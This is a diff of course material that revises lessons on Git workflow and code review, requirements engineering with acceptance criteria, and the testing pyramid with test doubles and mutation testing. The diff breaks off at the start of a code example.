-git bisect bad                         # HEAD is broken
-git bisect good v1.2.0                 # this was fine
-git bisect run pytest tests/test_x.py  # fully automatic
-git bisect reset
-
-# Who changed this line, and why, ignoring pure reformatting:
-git log -S "compute_discount" --oneline    # commits touching a STRING
-git blame -w -C -- path/file.py            # -w ignores whitespace churn
-git log --follow -p -- path/file.py        # full history across renames
+Ada rebases onto main → conflict in the rename + edit.
+Resolve: keep order_total, preserve Ada's tax logic.
+Open PR: small diff, link to acceptance criteria from Phase 73,
+         note "verified with unit tests for GB VAT + US no-VAT."
+Reviewer checks: tax cap boundary, no secret in commit, DoD.
+Merge (squash if intermediate commits were "wip").
 ```
 
-```yaml
-# A pull request template that encodes the review discipline above.
-# Save as .github/pull_request_template.md
+That loop — branch, conflict, review, merge — is the daily texture of Story X. Git.md deepens the object model and recovery drills; Projects.md Git cards make the muscle memory.
 
-## What changed and why
-<!-- The reviewer has none of your context. Two sentences. -->
+**PRACTICE:**
 
-## How I verified it
-<!-- Not "it works". Which tests, which manual check, which case. -->
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Run `git cat-file -p HEAD` and walk commit → tree → blob by hand; explain why a branch is *O*(1) |
+| Easy | Complete Learn Git Branching Main + Remote intro sequences |
+| Medium | Create a deliberate merge conflict, resolve markers by hand, draw merge vs rebase vs squash graphs for the same divergence |
+| Medium | `reset --hard` then recover via reflog; use `git bisect` (or `bisect run`) across ≥30 commits |
+| Hard | Stage two unrelated hunks from one file into two commits with `git add -p`; write a review checklist tailored to your repo from Google's guide |
 
-## Risk and rollback
-<!-- What breaks if this is wrong, and how do we undo it -->
+**WHAT THIS UNLOCKS NEXT:**
 
-## Reviewer, please focus on
-<!-- Direct attention. Undirected review finds typos, not bugs. -->
-
-<!-- Checklist
-     [ ] diff is small enough to review in 20 minutes
-     [ ] tests cover the new behaviour AND the failure path
-     [ ] no formatting-only churn mixed in with logic changes
-     [ ] commit messages explain WHY, the diff already shows what  -->
-```
-
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
-
-Interviewers rarely quiz Git commands directly, but "walk me through how you'd handle a merge conflict" or "what do you look for in a code review" test whether you've actually worked in a team codebase, not just solo scripts. The question that most reliably separates people is "what is the difference between merge and rebase, and when would you use each," where the expected answer includes the rule about never rebasing shared history and the reason for it. Expect "you just committed a password, what do you do," where the correct answer is that removing it from the latest commit is insufficient because it remains in history and possibly on a remote, so the credential must be rotated first and the history rewritten second. Expect "a bug appeared somewhere in the last few hundred commits, how do you find it," which is `git bisect` and is a satisfying place to connect back to binary search. Also common: "what is the difference between `reset` and `revert`," where the distinction is rewriting history versus adding a commit that undoes, and the practical rule is `revert` on anything shared. On the review side, "how do you handle a disagreement in code review" and "what makes a good pull request" are behavioural questions with technical content, and the strongest answers mention diff size, separating blocking from non-blocking comments, and letting tooling handle style.
-
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
-
-| Difficulty | Task                                                                                                                                                                                               |
-| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Complete the Main and Remote introduction sequences on [Learn Git Branching](https://learngitbranching.js.org/)                                                                                    |
-| Easy       | Run `git cat-file -p HEAD` and walk by hand from the commit to a tree to a blob. Report each hash                                                                                                  |
-| Easy       | Create the same file content under two different names, commit, and prove from the tree that only one blob exists                                                                                  |
-| Easy       | Print the contents of `.git/refs/heads/main` and explain in one sentence why branching is $O(1)$                                                                                                   |
-| Easy       | Write three commit messages for real changes you have made, following [Conventional Commits](https://www.conventionalcommits.org/)                                                                 |
-| Medium     | Create a deliberate merge conflict between two branches, resolve it by hand, and explain what each conflict marker meant                                                                           |
-| Medium     | Take a branch with five messy commits and use interactive rebase to reduce it to three coherent ones with rewritten messages                                                                       |
-| Medium     | Do a `git reset --hard` that destroys work, then recover it entirely using the reflog                                                                                                              |
-| Medium     | Use `git bisect run` with a real test script to find an intentionally introduced bug across at least 30 commits, and report how many steps it took                                                 |
-| Medium     | Stage two unrelated changes from the same file into two separate commits using `git add -p`                                                                                                        |
-| Medium     | Compare merge, rebase, and squash merge on the same divergent history, then draw all three resulting graphs                                                                                        |
-| Medium     | Review a real pull request in an open-source project and write three comments, marking each as blocking or non-blocking                                                                            |
-| Hard       | Implement a minimal Git in any language: `init`, `hash-object`, `cat-file`, `write-tree`, and `commit-tree`, then verify real `git log` can read your commits                                      |
-| Hard       | Accidentally commit a secret, then remove it from all history with `git filter-repo`, and write down every step including credential rotation and coordinating force-pushes with collaborators     |
-| Hard       | Set up a repository with a pre-commit hook that runs formatting and linting, and a pre-push hook that runs tests, then explain why hooks are advisory and what enforces the same rules server-side |
-| Hard       | Take a repository with a year of history and write a script that reports the ten files changed most often, then argue what that says about where the design is weakest                             |
-| Hard       | Design a branching strategy for a team of twenty shipping daily, then write down every failure mode it has and what compensates for each                                                           |
-| Hard       | Read [Google's Code Review Developer Guide](https://google.github.io/eng-practices/review/) in full and write a review checklist tailored to your own codebase, justifying every item              |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - Requirements Engineering:** Git records *what* changed and *who* reviewed it. It does not decide *what should be built*. Ambiguous requests ("make it better", "add a dashboard") produce thrashing commits and angry reviews. Turning ambiguity into a buildable spec is Phase 73.
+Git records *what* changed and *who* reviewed it. It does not decide *what should be built*. Ambiguous requests (“make it better,” “add a dashboard”) produce thrashing commits and angry reviews. Turning ambiguity into a buildable spec is Phase 73.
 
 ---
 
@@ -15650,51 +12721,98 @@ Interviewers rarely quiz Git commands directly, but "walk me through how you'd h
 
 ---
 
-
-
 # PHASE 73 - Requirements Engineering
 
 **Track:** Professional Software Engineering
 
-**WHAT YOU WILL BE ABLE TO DO:** Turn an ambiguous stakeholder request into a short specification a teammate could build from unaided - with goals, constraints, acceptance criteria, and explicit non-goals.
+**WHAT YOU WILL BE ABLE TO DO:** Turn an ambiguous stakeholder request into a short specification a teammate could build from unaided — with goals, constraints, acceptance criteria, and explicit non-goals.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 72 (you can propose changes as PRs; requirements decide *which* changes are worth proposing), Phase 21-30 (interfaces and invariants are how specs become code).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 72 — you can propose changes as PRs; requirements decide *which* changes are worth proposing. Phases 21–30 — interfaces and invariants are how specs become code.
+
+**LEARNING RESOURCES:**
+
+- [Software Requirements vs User Stories (Modern Software Engineering)](https://www.youtube.com/watch?v=KP0U3I-f9-Y)
+- [IEEE-style SRS qualities](https://www.inf.ed.ac.uk/teaching/courses/seoc/2004_2005/resources/re_intro.pdf) — correct, unambiguous, complete, consistent, verifiable, modifiable (skim)
+- [Atlassian — User stories with acceptance criteria](https://www.atlassian.com/agile/project-management/user-stories)
+- Practice: rewrite one vague ticket from any open-source issue tracker into goal + constraints + acceptance criteria
 
 ## 73.1 From Ambiguity to a Buildable Spec
 
-**WHY YOU ARE LEARNING THIS:** Most "failed" projects did not fail at Git or syntax - they failed because nobody agreed what *done* meant. Requirements engineering is the discipline of making that agreement cheap to check: who the user is, what problem you solve, what you will *not* build, and how you will know it works.
+You can now propose a clean PR and survive a conflict. That skill is wasted if the ticket said “add notifications” and three engineers built three different products. Most “failed” projects did not fail at Git or syntax — they failed because nobody agreed what *done* meant. Requirements engineering is the cheap agreement: who the user is, what problem you solve, what you will *not* build, and how you will know it works.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**THE MINI-SPEC:**
 
-- Overview: [Software Requirements vs User Stories (Modern Software Engineering)](https://www.youtube.com/watch?v=KP0U3I-f9-Y) *(Composio YouTube)*
-- Written: IEEE 830-style SRS qualities - correct, unambiguous, complete, consistent, verifiable, modifiable *(Composio web)*; [Pohl - Requirements Engineering intro (PDF)](https://people.eecs.ku.edu/~saiedian/Teaching/812/Lectures/Misc/pohl-intro-re.pdf) *(Composio Scholar)*
-- Practice: rewrite one vague ticket from any open-source issue tracker into goal + constraints + acceptance criteria
+A useful one-pager (or ticket body) answers:
 
-**STEP-BY-STEP EXPLANATION**
+1. **Goal** — what user outcome improves if we succeed?
+2. **Users & context** — who, where, under what constraints (time, device, permissions)?
+3. **Functional behavior** — inputs → outputs / states the system must produce.
+4. **Non-functional** — speed, safety, privacy, accessibility — measurable where possible.
+5. **Acceptance criteria** — concrete checks a reviewer can run without re-interpreting the ask.
+6. **Non-goals** — what is explicitly out of scope for *this* slice.
 
-A useful mini-spec answers these questions:
+**User stories** (“As a … I want … so that …”) are a *format*, not a substitute for acceptance criteria. A story without Given/When/Then (or equivalent checks) is still ambiguous. Good acceptance criteria become Phase 74 tests almost verbatim — if you cannot say how you will *check* done, you do not yet have a requirement.
 
-1. **Goal** - what user outcome improves if we succeed?
-2. **Users & context** - who, where, under what constraints (time, device, permissions)?
-3. **Functional behavior** - what the system must do (inputs → outputs / states).
-4. **Non-functional** - speed, safety, privacy, accessibility - measurable where possible.
-5. **Acceptance criteria** - concrete checks a reviewer can run without re-interpreting the ask.
-6. **Non-goals** - what is explicitly out of scope for *this* slice.
-
-**User stories** ("As a … I want … so that …") are a *format*, not a substitute for acceptance criteria. A story without Given/When/Then (or equivalent checks) is still ambiguous. Good acceptance criteria become Phase 74 tests almost verbatim - if you cannot say how you will *check* done, you do not yet have a requirement.
+**FROM VAGUE TO BUILDABLE (BOOKSTORE):**
 
 ```text
 Vague:  "Add notifications"
-Better: "As a signed-in user, I want an in-app badge when a teammate
-         comments on my PR, so I can reply within one business day."
-Accept: Given I am signed in and watching a PR,
-        When a teammate posts a comment,
-        Then I see a badge within 30s on next page load
-        And the badge clears when I open that PR.
-Non-goal: email/SMS, mobile push, @-mention storms.
+
+Still vague: "Notify users about activity"
+
+Buildable slice:
+  Goal: Signed-in users reply to PR comments within one business day
+        without refreshing endlessly.
+  Users: bookstore staff using the admin web app on desktop.
+  Behavior: in-app badge when a teammate comments on a PR I watch.
+  Non-functional: badge visible within 30s of next page load;
+                  no PII in badge text beyond display name.
+  Acceptance:
+    Given I am signed in and watching PR #42,
+    When a teammate posts a comment,
+    Then I see a badge on next page load within 30s
+    And the badge clears when I open that PR.
+  Non-goals: email/SMS, mobile push, @-mention storms, Slack bots.
 ```
 
-**SMALL WORKING EXAMPLE**
+Same pattern for a worse ticket:
+
+```text
+Vague: "Make login better"
+
+Better:
+  Goal: Reduce password-reset tickets from staff who mistype once.
+  Constraints: keep Phase 68 session model; no SMS MFA in this slice.
+  Acceptance:
+    Given valid email+password,
+    When I submit login,
+    Then I reach /dashboard within 2s on a warm server
+    And a wrong password shows a generic error (no user enumeration).
+  Non-goals: OAuth providers, magic links, redesign of the whole nav.
+```
+
+**QUALITY BAR (LIGHT IEEE HABITS):**
+
+| Quality | Failure mode if missing |
+| ------- | ----------------------- |
+| Unambiguous | Two readers build different things |
+| Verifiable | “Fast” / “intuitive” with no check |
+| Complete *for the slice* | Hidden “obvious” assumptions |
+| Consistent | Criteria contradict non-goals |
+| Modifiable | Spec buried in a Slack thread nobody can update |
+
+You are not writing a 40-page SRS for a student bookstore feature. You *are* writing something a stranger on the team could implement for one sprint without pinging you every hour.
+
+**WORKED FLOW — TICKET → PR DESCRIPTION:**
+
+```text
+1. Stakeholder: "Customers should know when stock is back."
+2. Clarify: in-app only? email? which SKUs? guest users?
+3. Mini-spec + non-goals (email out of scope this sprint).
+4. Split: (a) watchlist table (b) badge on product page (c) clear-on-view.
+5. Each slice → Phase 72 PR with acceptance criteria pasted into
+   "How I verified it" as manual + automated checks.
+```
 
 ```python playground=cs-phase-73-acceptance-check
 # Tiny acceptance harness: a "spec" is a list of checks.
@@ -15718,15 +12836,19 @@ for name, state, expected in acceptance:
     print(f"{status}: {name}")
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+That harness is deliberately tiny — it shows the *shape*. Phase 74 turns the same Given/When/Then into a lasting automated pyramid.
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
-| Easy | List the mini-spec questions from memory |
-| Medium | Turn "make login better" into goal, constraints, 3 acceptance criteria, 2 non-goals |
-| Hard | Take a real open issue; write a one-page spec a stranger could implement for one sprint |
+| Easy | List the six mini-spec questions from memory |
+| Medium | Turn “make checkout better” into goal, constraints, ≥3 acceptance criteria, ≥2 non-goals |
+| Hard | Take a real open-source issue; write a one-page spec a stranger could implement for one sprint, then mark which criteria become unit vs E2E checks |
 
-**WHY THE NEXT TOPIC IS NEEDED - Testing:** A spec says what *should* happen. Automated tests are how you keep proving it still happens after every change - without relying on memory or a lucky demo. That is Phase 74.
+**WHAT THIS UNLOCKS NEXT:**
+
+A spec says what *should* happen. Automated tests keep proving it still happens after every change — without relying on memory or a lucky demo. That is Phase 74.
 
 ---
 
@@ -15734,236 +12856,95 @@ for name, state, expected in acceptance:
 
 ---
 
-
 # PHASE 74 - Testing
 
 **Track:** Professional Software Engineering
 
-**WHAT YOU WILL BE ABLE TO DO:** Prove behavior automatically - sketch a test pyramid and explain what unit, integration, and end-to-end layers each catch (and what they cost).
+**WHAT YOU WILL BE ABLE TO DO:** Prove behavior automatically — sketch a test pyramid and explain what unit, integration, and end-to-end layers each catch (and what they cost).
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 73 (acceptance criteria become the first tests worth writing), Phase 48 (testable design follows dependency inversion).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 73 — acceptance criteria become the first tests worth writing. Phase 48 — testable design follows dependency inversion.
+
+**LEARNING RESOURCES:**
+
+- [The Practical Test Pyramid (Ham Vocke / Martin Fowler)](https://martinfowler.com/articles/practical-test-pyramid.html)
+- [The Testing Pyramid (Continuous Delivery, Dave Farley)](https://www.youtube.com/watch?v=Af4M8GMoxi4)
+- [TDD, Where Did It All Go Wrong (Ian Cooper)](https://www.youtube.com/watch?v=EZ05e7EMOLM)
+- [Google Testing Blog — Test sizes](https://testing.googleblog.com/2010/12/test-sizes.html)
+- [pytest documentation](https://docs.pytest.org/) · [Hypothesis](https://hypothesis.readthedocs.io/) for property-based testing
 
 ## 74.1 The Testing Pyramid
 
-**WHY YOU ARE LEARNING THIS:** Manually re-checking that every feature still works after every change doesn't scale past a tiny codebase - it's slow, error-prone, and people skip it under deadline pressure. Automated tests encode "this should still be true" as code itself, so it can be re-verified in seconds, as often as needed, forever.
+Acceptance criteria from Phase 73 are useless if “done” means “worked on my laptop once.” Manually re-checking every feature after every change does not scale — people skip it under deadline pressure. Automated tests encode “this should still be true” as code, so it can re-verify in seconds, forever.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**ARRANGE / ACT / ASSERT:**
 
-- Written (Composio fetch): [The Practical Test Pyramid (Ham Vocke / Martin Fowler)](https://martinfowler.com/articles/practical-test-pyramid.html) *(Composio web + fetch)*; classic bliki: [Test Pyramid](https://martinfowler.com/bliki/TestPyramid.html)
-- Best animated explanation: [The Testing Pyramid (Continuous Delivery, Dave Farley)](https://www.youtube.com/watch?v=Af4M8GMoxi4) - Farley wrote the book on continuous delivery and this is the clearest treatment of *why* the shape is a pyramid rather than a rectangle. Pair with [Unit Testing Is The BARE MINIMUM (Modern Software Engineering)](https://www.youtube.com/watch?v=h-4i5N89TUI) *(Composio YouTube; replaced dead ByteByteGo ID)*
-- Alternative: [Programming Terms: Unit Tests (Corey Schafer)](https://www.youtube.com/watch?v=6tNS--WetLI) for the internal steps from zero, and [Test Driven Development (Fireship)](https://www.youtube.com/watch?v=Jv2uxzhPFl4) for the workflow in three minutes
-- Another angle: [TDD, Where Did It All Go Wrong (Ian Cooper)](https://www.youtube.com/watch?v=EZ05e7EMOLM) is the most valuable hour in this section and argues that most people test the wrong unit, which is exactly why their test suites become a maintenance burden. Then [The 3 Types of Unit Test in TDD (Modern Software Engineering)](https://www.youtube.com/watch?v=W40mpZP9xQQ) *(Composio YouTube; replaced dead mocking ID)* for how small tests should actually be scoped
-- Interactive simulator: mutation testing is the closest thing to a simulator here, and it is genuinely revelatory. Run [mutmut](https://github.com/boxed/mutmut) or [Stryker](https://stryker-mutator.io/) against your own suite: it deliberately introduces bugs into your code and reports which ones your tests failed to catch, which measures whether your tests actually assert anything rather than merely executing lines. Also run a coverage tool with branch coverage enabled and open the HTML report to see exactly which paths never execute
-- Written documentation: [Martin Fowler on the Test Pyramid](https://martinfowler.com/articles/practical-test-pyramid.html) is the canonical article and worth reading twice, [Google's Testing Blog on test sizes](https://testing.googleblog.com/2010/12/test-sizes.html) for how it works when the amount of work grows, [pytest's documentation](https://docs.pytest.org/) for the best-designed test framework in any language, and [Hypothesis's docs](https://hypothesis.readthedocs.io/) for property-based testing
-- GitHub implementation: [pytest](https://github.com/pytest-dev/pytest) itself, [Hypothesis](https://github.com/HypothesisWorks/hypothesis) for property-based testing, [testcontainers](https://github.com/testcontainers/testcontainers-python) which runs real databases in Docker for integration tests, and [Playwright](https://github.com/microsoft/playwright) for end-to-end
-- Practice platform: [Exercism](https://exercism.org/) hands you the tests first and asks you to satisfy them, which builds the habit from the other direction. [Codewars](https://www.codewars.com/) and the katas at [Kata-Log](https://kata-log.rocks/) include TDD-specific exercises, and the Gilded Rose kata is the classic exercise in writing tests for code you did not write and cannot yet safely change
+Every test has the same three phases: set up state, exercise the behaviour, assert the outcome. A test that mixes these — or asserts several unrelated things — is the one nobody understands when it fails in six months.
 
-**STEP-BY-STEP EXPLANATION**
-
-Every test has the same three phases regardless of level, and naming them makes tests easier to write and far easier to read: **arrange** the state, **act** on the thing under test, **assert** the outcome. A test that mixes these together, or that asserts several unrelated things, is the test you will not understand in six months when it fails.
-
-The pyramid's shape follows from a single trade-off. As you move up, a test covers more of the real system and therefore catches more classes of bug, and simultaneously becomes slower, more expensive to maintain, and less precise about *what* broke. A unit test failing tells you which function is wrong. An end-to-end test failing tells you that something, somewhere, in a system of forty components, is wrong. Both facts are useful and they are not interchangeable, which is why the answer is a distribution rather than a choice. The number that matters is total feedback time: a suite you run on every save must complete in seconds, and anything slower gets run less often, which is the same reliability problem code review solved by automation.
-
-**What a unit is** turns out to be the most consequential decision in testing, and getting it wrong is why so many suites become an obstacle to change. If a unit is "one class," then every refactor that moves logic between classes breaks tests that were asserting nothing about behaviour, only about structure. If a unit is "one observable behaviour, tested through a stable public interface," you can restructure the implementation freely and the tests keep verifying what the user cares about. The practical test is: can I rename and reorganise my internals without editing a single test? If not, the tests are coupled to the design rather than the behaviour.
-
-**Test doubles** are the other place suites go wrong, and the vocabulary is worth being precise about. A **stub** returns canned data so the test can proceed. A **fake** is a working lightweight implementation, such as an in-memory repository. A **mock** records interactions and asserts that specific calls happened. Stubs and fakes assert on outcomes and are usually safe. Mocks assert on implementation, which means they break when you refactor, and they can pass while the real integration is broken because the mock and reality have drifted apart. The defensible rule is to mock only at genuine boundaries you do not own, such as a payment provider or an email service, and to use real implementations or fakes everywhere inside your own system. Containerised real databases have made "just use the real thing" cheap enough that mocking your own database is now usually the wrong call.
-
-Two properties separate a suite that helps from one that hurts. Tests must be **deterministic**, because a test that fails intermittently trains the team to ignore failures, and a suite people ignore has negative value. The usual sources of flakiness are real time, real network calls, shared mutable state between tests, and dependence on execution order. And tests must be **independent**, meaning any subset can run in any order, which is what allows parallel execution and makes the suite fast enough to stay in the loop.
-
-**Coverage** is worth understanding precisely because it is so widely misused. Line coverage measures which lines executed, not whether anything was asserted about them, so a test suite that calls every function and asserts nothing reaches 100 percent. Branch coverage is meaningfully better because it requires both sides of every condition. Neither measures whether the assertions are correct, which is exactly what mutation testing does measure, and running a mutation tool once against a suite you were proud of is a reliably humbling experience. The useful way to read coverage is as a finder of untested regions rather than as a score to maximise.
-
-Finally, **test-driven development** is a design technique that happens to produce tests, not a testing technique. Writing the test first forces you to specify the interface before the implementation, and code that is hard to test is almost always code with too many dependencies or unclear responsibilities, which means the difficulty is feedback about the design rather than about testing. The red-green-refactor loop is the whole method: a failing test, the simplest code that passes it, then improvement with the test holding you steady.
-
-**Mental Model - why a *pyramid*, not one type of test:**
+**WHY A PYRAMID (NOT AN ICE-CREAM CONE):**
 
 ```text
         /\
-       /  \      End-to-End (E2E) tests -- FEW of these
-      /----\     Test the whole system together, like a real user would
-     /      \    (slow, brittle, but catch real integration failures)
-    /--------\   Integration tests -- SOME of these
-   /          \  Test how a few components work together
-  /------------\ Unit tests -- MANY of these
- /______________\Test one function/class in isolation
-                  (fast, cheap, pinpoint exactly what broke)
+       /  \      End-to-End — FEW
+      /----\     whole system as a user would (slow, brittle, catches wiring)
+     /      \
+    /--------\   Integration — SOME
+   /          \  a few real components together (DB, queue)
+  /------------\ Unit — MANY
+ /______________\ pure logic, no I/O (fast, precise failures)
 ```
 
-**BEFORE VS. AFTER**
+As you move up, a test covers more of the real system and catches more *classes* of bug — and simultaneously becomes slower, costlier to maintain, and less precise about *what* broke. Total feedback time governs behaviour: a suite you run on every save must finish in seconds; anything slower gets run less often.
 
 ```text
-All manual testing, or all E2E tests
-        Problem: E2E tests are slow (spinning up a whole system) and
-        brittle (a tiny UI change can break a test that has nothing to
-        do with the actual bug it's meant to catch) -- running the full
-        suite on every change becomes impractical.
+                          count   speed        failure tells you
+  E2E                        ~10   30s–5min    "something in the system"
+  Integration               ~100   0.1–2s      "these two components disagree"
+  Unit                     ~1000   <10ms       "THIS function, THIS input"
 
-A pyramid, weighted toward fast unit tests
-        Fix: most logic is verified cheaply and quickly at the unit level;
-        integration tests confirm the pieces fit together; a SMALL number
-        of E2E tests confirm the critical user-facing paths work end to end.
-        Trade-off: unit tests alone can all pass while the system is still
-        broken as a whole (each piece works, but they don't fit together)
-        -- which is exactly why integration and E2E layers still exist,
-        just in smaller numbers.
+  1000 unit × 5ms  = 5s     → every save
+   100 integ × 500ms = 50s  → before push
+    10 e2e  × 60s  = 600s   → CI on the branch
+
+  Invert (mostly E2E): hours of suite → ignored → NEGATIVE value
 ```
 
-**PICTURE IT LIKE THIS**
+**WHAT A “UNIT” IS:**
 
-Consider how an aircraft is verified before it flies. Every individual bolt, rivet, and hydraulic seal is tested on a bench, thousands of times, cheaply and quickly, and when one fails you know exactly which part is bad. That is the unit layer, and there are enormous numbers of these because they are nearly free. Assemblies are then tested together: the wing with its control surfaces and hydraulics, verifying that parts which each passed individually actually fit and interact correctly. That is integration, and there are fewer because a test rig for a wing costs vastly more than a rig for a bolt. Finally the assembled aircraft is flown, a handful of times, at enormous expense, to verify the thing customers actually care about. That is end-to-end.
+If a unit is “one class,” every refactor that moves logic breaks tests that asserted structure, not behaviour. If a unit is “one observable behaviour through a stable public interface,” you restructure freely and tests keep verifying what users care about. Practical test: can you rename internals without editing a single test?
 
-The reason nobody proposes skipping the bench tests and simply flying the plane more often is the reason the pyramid has its shape. A test flight that ends badly tells you the aircraft is wrong and almost nothing about which of a million parts caused it, and you cannot afford to run one after every design change. Conversely nobody argues that testing every bolt is sufficient, because a wing assembled from perfect parts in the wrong order is still a wing that fails. The distribution is the answer, and it follows from cost and diagnostic precision rather than from anyone's preference.
+**TEST DOUBLES (USE THE RIGHT TOOL):**
 
-Mocking has an analogy too, and it explains the risk exactly. Testing the wing against a simulated fuselage is fast and useful, and it will happily pass if your simulated fuselage has the bolt pattern the wing expects rather than the one the real fuselage has. That is a mock drifting from reality, and it is why the assembled aircraft still gets flown.
+| Double | Role | Asserts on | Risk |
+| ------ | ---- | ---------- | ---- |
+| **Real** | Actual dependency | Outcomes | Best when affordable |
+| **Fake** | Working lightweight (in-memory repo) | Outcomes | Usually the right default inside your system |
+| **Stub** | Canned answers | Outcomes | Fine for inputs |
+| **Mock** | Records calls | *Implementation* | Breaks on refactor; can pass while production is broken |
 
-**Internal Working, the cost and precision gradient**
+Defensible rule: mock only boundaries you do not own (payment provider, SMS, clock). Prefer real DB via containers over mocking *your own* SQL. For anything you mock, add one **contract** check against the real sandbox on a schedule so drift surfaces as a red build, not a customer ticket.
 
-```text
-                          count   speed        what a failure tells you
-  /\
- /E2E\      end to end       ~10   30s-5min    "something in the system
-/------\    real browser,                       is broken"  -- and now
-                real DB,                        you go hunting
-                real network
+**COVERAGE VS MUTATION:**
 
-/--------\   integration    ~100   0.1-2s      "these two components do
-/          \  real DB in a                       not agree"  -- narrowed
-              container, no                      to a seam
-              browser
-
-/------------\ unit        ~1000   <10ms       "THIS function returns the
-/              \ pure logic,                     wrong value for THIS
-                  no I/O at all                  input"  -- exact
-
-  Total suite time is what actually governs behaviour:
-      1000 unit  x   5ms  =    5 s     run on every file save
-       100 integ  x 500ms  =   50 s     run before every push
-        10 e2e    x  60s   =  600 s     run in CI on the branch
-
-  Invert the pyramid ("ice cream cone") and you get:
-       1000 e2e   x  60s   = 16.6 hours -> nobody runs it
-                             -> failures are ignored
-                             -> the suite has NEGATIVE value
-
-  This is why the shape is not a stylistic preference. It is the
-  only distribution where the fast layers stay in the developer's
-  feedback loop, which is the only place tests prevent bugs rather
-  than merely reporting them later.
-```
-
-**Internal Working, what a test double is and when each is safe**
-
-```text
-Real:   the actual thing.                Best when affordable.
-            db = PostgresRepo(real_connection)
-
-Fake:   a working lightweight version.   Usually the right default.
-            db = InMemoryRepo()          # real behaviour, no I/O
-        Asserts on OUTCOMES. Survives refactoring.
-
-Stub:   returns canned answers.          Fine for inputs.
-            rates.get_usd_eur = lambda: 0.92
-        Asserts on OUTCOMES. Survives refactoring.
-
-Mock:   records calls and asserts them.  Use sparingly.
-            mock_email.assert_called_once_with(to="a@b.c")
-        Asserts on IMPLEMENTATION. Breaks on refactoring, and
-        can pass while production is broken.
-
-WHY MOCKS BITE, concretely:
-
-  test:        mock_payments.charge(amount=100)  -> asserted
-  reality:     the provider renamed it to charge(cents=10000)
-  outcome:     test passes forever. Production takes no money.
-
-  The mock encoded YOUR BELIEF about the boundary, and beliefs
-  drift from reality silently.
-
-DEFENSIBLE RULE
-  mock only what you do not own and cannot run:
-      payment provider, email/SMS, third-party API, the clock
-  use the real thing or a fake for everything you do own:
-      your database (testcontainers), your cache, your queue
-
-  And for anything you mock at a boundary, add ONE contract test
-  that runs against the real service on a schedule, so drift is
-  detected by a failing test rather than by a customer.
-```
-
-**Internal Working, coverage versus mutation testing**
+Line coverage measures which lines *ran*, not whether anything was asserted. A suite that calls every function and asserts nothing can hit 100%. Branch coverage is better. **Mutation testing** asks the only question that matters: if I break the code on purpose, does a test fail?
 
 ```text
 def apply_discount(price, percent):
     if percent > 50:
-        percent = 50            # cap
+        percent = 50
     return price * (1 - percent / 100)
 
-TEST A
-    def test_it_runs():
-        apply_discount(100, 10)          # no assertion at all
-
-    line coverage:    100%   <- every line executed
-    branch coverage:   50%   <- the percent > 50 branch never taken
-    bugs it catches:    0    <- it asserts nothing
-
-TEST B
-    def test_basic():  assert apply_discount(100, 10) == 90
-    def test_cap():    assert apply_discount(100, 90) == 50
-
-    line coverage:    100%
-    branch coverage:  100%
-    bugs it catches:  most
-
-MUTATION TESTING asks the only question that matters: if I break
-the code on purpose, does a test fail?
-
-    mutant 1:  percent > 50   ->  percent >= 50    KILLED by test_cap?
-                                                   no! 50 vs 50 is
-                                                   indistinguishable
-                                                   -> SURVIVED
-    mutant 2:  percent = 50   ->  percent = 51     -> killed
-    mutant 3:  1 - percent    ->  1 + percent      -> killed
-
-    Surviving mutant 1 tells you precisely what to add:
-        assert apply_discount(100, 50) == 50    # the boundary itself
-
-  Coverage tells you which lines RAN.
-  Mutation testing tells you which lines are ACTUALLY DEFENDED.
+# Assert only apply_discount(100, 10) == 90
+# Mutant: percent > 50  →  percent >= 50  may SURVIVE
+# Fix: also assert apply_discount(100, 50) == 50  (the boundary)
 ```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
+**TDD AS DESIGN FEEDBACK:**
 
+Red → green → refactor: write a failing test, simplest code that passes, improve with the test holding you steady. Difficulty writing a test is usually feedback about too many dependencies or unclear responsibilities — Phase 75 will make that cheap at application scale.
 
-| Layer          | Typical count    | Runtime each    | Catches                                            | Blind to                                 | Maintenance                                         |
-| -------------- | ---------------- | --------------- | -------------------------------------------------- | ---------------------------------------- | --------------------------------------------------- |
-| Unit           | thousands        | under 10 ms     | logic errors, edge cases, off-by-one               | wiring, config, real I/O behaviour       | low if testing behaviour, high if testing structure |
-| Integration    | hundreds         | 0.1 to 2 s      | schema mismatches, transaction bugs, serialization | full user journeys, browser behaviour    | moderate, needs real dependencies                   |
-| End to end     | tens             | 30 s to minutes | anything, including config and deployment          | nothing, but reports it imprecisely      | high, the most flake-prone layer                    |
-| Contract       | one per boundary | seconds         | third-party drift your mocks hide                  | your own logic                           | low                                                 |
-| Property-based | tens             | varies          | inputs no human would think of                     | anything not expressible as an invariant | low, but requires stating invariants                |
-
-
-
-| Choice                                | Gain                                           | Cost                                                |
-| ------------------------------------- | ---------------------------------------------- | --------------------------------------------------- |
-| Mock your own database                | milliseconds per test                          | tests pass while real SQL is wrong                  |
-| Real database in a container          | genuine confidence in queries and transactions | seconds per test, Docker in CI                      |
-| Test through public interfaces only   | refactor freely without touching tests         | some paths need indirect setup                      |
-| Test every class directly             | precise failures, easy setup                   | every refactor rewrites tests                       |
-| Chase 100 percent coverage            | no unexamined regions                          | tests written to hit lines, not to assert behaviour |
-| Branch coverage plus mutation testing | measures actual defence                        | mutation runs are slow, usually nightly             |
-| Test-driven development               | better interfaces, coverage as a side effect   | slower first draft, real discipline required        |
-
-
-The trade-off worth naming explicitly is that a test suite is code you must maintain, and it is therefore possible for it to cost more than it saves. That happens in specific, recognisable ways: tests coupled to structure rather than behaviour, so every refactor is triple the work; flaky tests, so failures stop being informative; and heavy mocking, so the suite is green while production is broken. None of these argue for fewer tests. They argue that the *quality* of tests matters more than the count, which is exactly why coverage as a target is a poor proxy and mutation score is a better one.
-
-**SMALL WORKING EXAMPLE**
+**WORKED PYRAMID (BOOKSTORE ORDER TOTAL):**
 
 ```python
-# ---------------------------------------------------------------
